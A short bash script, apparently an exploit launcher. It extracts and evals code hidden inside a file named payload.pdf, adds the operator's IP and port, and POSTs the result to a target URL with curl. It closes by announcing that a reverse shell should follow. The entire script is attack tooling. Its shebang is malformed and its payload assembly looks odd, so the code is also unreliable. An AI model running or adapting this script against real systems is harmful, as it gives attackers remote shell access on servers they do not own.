#/bin/bash

url=$1
loc_ip=$2
loc_port=$3

if [[ $url == "" ]]; then
  echo "Specify url"
  exit 1
fi


if [[ $loc_ip == "" ]]; then
  echo "Specify local ip"
  exit 1
fi

if [[ $loc_port == "" ]]; then
  echo "Specify local port"
  exit 1
fi


stage10=$(cat payload.pdf)
stage21=$(echo "$stage10" | sed -n '/%PDF-1.7/,/%PDF-1.7/p' | sed '1d;$d')
stage22=$(echo "$stage21$loc_ip$loc_port")
payload2=$(eval "$stage21")
payload3="${payload2}0x2A0x2C0xEF$stage10$stage22"
curl -s --output /dev/null -X POST -d "$payload3" "$url" 

echo "All done, if successful, you should get reverse shell"